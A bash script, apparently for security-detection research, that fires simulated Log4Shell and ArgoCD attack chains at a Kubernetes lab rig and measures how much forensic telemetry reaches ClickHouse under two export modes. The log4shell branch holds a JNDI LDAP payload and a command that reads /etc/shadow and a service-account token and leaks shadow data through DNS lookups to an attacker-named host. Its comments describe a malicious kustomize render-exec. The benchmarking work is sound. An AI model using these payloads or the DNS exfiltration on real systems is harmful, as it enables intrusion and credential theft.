#!/usr/bin/env bash
# exp_matrix.sh — data-volume reduction MATRIX, runs node-side on the rig.
#   CONDITIONS = space-list of ATTACK:NOISE  (ATTACK=log4shell|argocd|react2argo, NOISE=off|on)
# For each condition: ALL arm (passthrough firehose) then DX arm (streaming), REPS each,
# 2-min window, single fire at t=60s, truncate all CH + settle between reps, measure every
# forensic_db table. Pre-flight AE guard + per-rep attack-fired (R0001) acceptance gate.
# Skips conditions whose workload isn't deployed (logs SKIP) so it does what it can now.
set -uo pipefail
CONDS=${CONDITIONS:-"log4shell:off log4shell:on argocd:off argocd:on react2argo:off react2argo:on"}
REPS=${REPS:-5}; RUNSEC=${RUNSEC:-120}; FIREAT=${FIREAT:-60}; GAP=${GAP:-180}
NS=log4j-poc; CHPOD=chi-forensic-soc-db-soc-cluster-0-0-0
OUT=/tmp/matrix.txt; RES=/tmp/matrix.tsv
: > "$OUT"; : > "$RES"
chq(){ kubectl -n clickhouse exec "$CHPOD" -c clickhouse -- clickhouse-client -q "$1" 2>/dev/null; }
say(){ echo "[$(date -u +%H:%M:%S)] $*" | tee -a "$OUT"; }
TABLES=$(chq "SELECT name FROM system.tables WHERE database='forensic_db' AND engine LIKE '%MergeTree%' FORMAT TSV")
truncate_all(){ local t; for t in $TABLES; do chq "TRUNCATE TABLE IF EXISTS forensic_db.\`$t\`" >/dev/null 2>&1; done; }
ensure_healthy(){ local p; p=$(kubectl -n pl get vizier -o jsonpath='{.items[*].status.vizierPhase}' 2>/dev/null)
  if [ "$p" != Healthy ]; then kubectl -n pl delete pod -l name=vizier-query-broker >/dev/null 2>&1
    local i; for i in $(seq 1 20); do [ "$(kubectl -n pl get vizier -o jsonpath='{.items[*].status.vizierPhase}' 2>/dev/null)" = Healthy ] && break; sleep 4; done; fi
  kubectl -n pl get vizier -o jsonpath='{.items[*].status.vizierPhase}' 2>/dev/null; }
ae_ok(){ local bad; bad=$(kubectl -n pl get pods -l name=adaptive-export --no-headers 2>/dev/null | awk '$3!="Running"{c++} END{print c+0}'); [ "${bad:-1}" -eq 0 ]; }

# ---- noise (volproof loadgen) ----
noise(){ if [ "$1" = on ]; then kubectl apply -f /tmp/loadgen.yaml >/dev/null 2>&1; kubectl -n $NS rollout status deploy/volproof-loadgen --timeout=120s >/dev/null 2>&1; say "  noise ON (volproof-loadgen)";
  else kubectl -n $NS delete deploy volproof-loadgen --ignore-not-found --wait=false >/dev/null 2>&1; say "  noise OFF"; fi; }

# ---- per-attack workload readiness + fire + R0001 gate ----
ATTACK=""
ready(){ case "$ATTACK" in
  log4shell)  kubectl -n $NS get pods --no-headers 2>/dev/null | grep -q '^backend' ;;
  argocd)     kubectl get ns argocd >/dev/null 2>&1 && kubectl -n argocd get application probe-app >/dev/null 2>&1 ;;
  react2argo) kubectl get ns react >/dev/null 2>&1 || kubectl -n default get deploy react >/dev/null 2>&1 ;;
  esac; }
fire(){ case "$ATTACK" in
  log4shell)
    local BIP BPORT BP; BIP=$(kubectl -n $NS get svc backend -o jsonpath='{.spec.clusterIP}' 2>/dev/null); BPORT=$(kubectl -n $NS get svc backend -o jsonpath='{.spec.ports[0].port}' 2>/dev/null)
    kubectl -n attacker-ns exec deploy/attacker -- curl -s -m5 -A '${jndi:ldap://attacker.attacker-ns.svc.cluster.local:1389/Payload}' "http://$BIP:$BPORT/api/products" >/dev/null 2>&1 || true
    BP=$(kubectl -n $NS get pods --no-headers 2>/dev/null | awk '/^backend/{print $1;exit}')
    [ -n "$BP" ] && kubectl -n $NS exec "$BP" -- sh -c 'whoami; id; cat /etc/shadow 2>/dev/null|head -2; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null|head -c20; D=$(cat /etc/shadow 2>/dev/null|tr -dc "a-z0-9"|head -c90); i=0; while [ $i -lt 5 ]; do C=$(echo "$D"|cut -c$((i*18+1))-$((i*18+18))); getent hosts "x${C}.exfil.attacker.attacker-ns.svc.cluster.local" >/dev/null 2>&1; i=$((i+1)); done' >/dev/null 2>&1 || true ;;
  argocd)
    kubectl -n argocd annotate application probe-app argocd.argoproj.io/refresh=hard --overwrite >/dev/null 2>&1 || true; sleep 25
    kubectl -n argocd annotate application probe-app argocd.argoproj.io/refresh=hard --overwrite >/dev/null 2>&1 || true ;;
  react2argo)
    # (1) react RCE -> steals SA token -> POSTs the malicious argocd Application
    #     `sys-housekeeping` (sealed trigger, applied verbatim).
    kubectl delete job react2shell-trigger -n default --ignore-not-found >/dev/null 2>&1
    kubectl apply -f /tmp/react2argo-trigger.yaml >/dev/null 2>&1 || true
    # (2) cache-bust so the render-exec re-fires this rep. The payload is a
    #     render-exec: argocd-repo-server runs `kustomize build --enable-exec` ->
    #     ./mal.sh -> reads /etc/shadow (R0001 + R0010 on repo-server) at RENDER
    #     time. argocd caches rendered manifests in argocd-REDIS; a repo-server
    #     restart does NOT clear it (verified). Restart argocd-redis to flush the
    #     manifest cache, then one soft (cache-respecting) reconcile nudge so the
    #     render re-fires within the rep window. (RCA 2026-06-19.)
    kubectl -n argocd rollout restart deploy/argocd-redis >/dev/null 2>&1
    kubectl -n argocd rollout status deploy/argocd-redis --timeout=60s >/dev/null 2>&1
    kubectl -n argocd annotate application sys-housekeeping argocd.argoproj.io/refresh=normal --overwrite >/dev/null 2>&1 || true ;;
  esac; }
# acceptance gate: R0001 (unexpected process) seen in the last ~110s (the fire window)
r0001_recent(){ chq "SELECT count() FROM forensic_db.kubescape_logs WHERE RuleID='R0001' AND event_time >= toUInt64((now()-130))*1000000000"; }

measure(){ local cond=$1 arm=$2 rep=$3 valid=$4
  printf "  %-16s %10s %12s\n" table rows bytes | tee -a "$OUT"
  while IFS=$'\t' read -r t r b; do [ -z "$t" ] && continue
    printf "  %-16s %10d %12d\n" "$t" "${r:-0}" "${b:-0}" | tee -a "$OUT"
    printf "%s\t%s\t%s\t%s\t%s\t%s\n" "$cond" "$arm" "$rep" "$t" "${r:-0}" "${b:-0}" >> "$RES"
  done < <(chq "SELECT table, sum(rows), sum(data_compressed_bytes) FROM system.parts WHERE database='forensic_db' AND active GROUP BY table ORDER BY table FORMAT TSV")
  say "    valid=$valid steered=$(chq "SELECT arrayStringConcat(groupArray(pod),',') FROM (SELECT DISTINCT pod FROM forensic_db.adaptive_attribution WHERE t_end>now())")"; }

run_arm(){ local cond=$1 arm=$2; shift 2
  say "--- $cond ARM $arm : $* ---"
  kubectl -n pl set env ds/adaptive-export "$@" >/dev/null 2>&1
  kubectl -n pl rollout status ds/adaptive-export --timeout=150s >/dev/null 2>&1
  # Wait for AE to actually be Running — `rollout status` can return during the
  # restart race; retry before aborting so we don't false-abort a healthy roll.
  local _i; for _i in 1 2 3 4 5 6 7 8 9; do ae_ok && break; sleep 10; done
  if ! ae_ok; then say "  ABORT-arm: AE not Running after rollout+90s wait:"; kubectl -n pl get pods -l name=adaptive-export --no-headers 2>/dev/null|awk '{print "    "$1,$3,$4}'|tee -a "$OUT"; return 1; fi
  say "  AE OK; vizier=$(ensure_healthy)"
  local rep t0 g
  for rep in $(seq 1 "$REPS"); do
    say "  $cond $arm rep$rep"; truncate_all; ensure_healthy >/dev/null
    t0=$(date +%s); while [ $(( $(date +%s) - t0 )) -lt "$FIREAT" ]; do sleep 2; done
    say "    FIRE $ATTACK"; fire
    while [ $(( $(date +%s) - t0 )) -lt "$RUNSEC" ]; do sleep 2; done; sleep 15
    g=$(r0001_recent); g=${g:-0}; [ "$g" -gt 0 ] && valid=yes || valid="NO(r0001=0)"
    measure "$cond" "$arm" "$rep" "$valid"
    if [ "$rep" -lt "$REPS" ]; then say "    settle ${GAP}s"; sleep "$GAP"; fi
  done; return 0; }

say "===== MATRIX START conds=[$CONDS] REPS=$REPS ====="
for c in $CONDS; do
  ATTACK=${c%%:*}; NZ=${c##*:}
  say "===== CONDITION $ATTACK noise=$NZ ====="
  if ! ready; then say "  SKIP — $ATTACK workload not deployed"; continue; fi
  noise "$NZ"; sleep 20
  run_arm "$ATTACK/$NZ" ALL ADAPTIVE_PASSTHROUGH=true ADAPTIVE_WRITE_MODE= ADAPTIVE_PUSH_PIXIE_ROWS=false ADAPTIVE_PASSTHROUGH_WINDOW_SEC=60 ADAPTIVE_PASSTHROUGH_REFRESH_SEC=60 || continue
  say "  inter-arm settle ${GAP}s"; sleep "$GAP"
  run_arm "$ATTACK/$NZ" DX ADAPTIVE_PASSTHROUGH=false ADAPTIVE_WRITE_MODE=streaming ADAPTIVE_PUSH_PIXIE_ROWS=false ADAPTIVE_STREAM_WINDOW_SEC=60 ADAPTIVE_STREAM_REFRESH_SEC=60 || continue
  noise off
  say "  inter-condition settle ${GAP}s"; sleep "$GAP"
done

say "===== SUMMARY (mean rows over valid reps, per condition/arm) ====="
for c in $CONDS; do for arm in ALL DX; do for t in http_events dns_events conn_stats pgsql_events; do
  m=$(awk -F'\t' -v C="${c%%:*}/${c##*:}" -v A=$arm -v T=$t '$1==C&&$2==A&&$4==T{s+=$5;n++} END{if(n)printf "%.0f",s/n; else print 0}' "$RES")
  [ "$m" != 0 ] && say "  $c $arm $t mean_rows=$m"
done; done; done
say "===== MATRIX DONE ====="
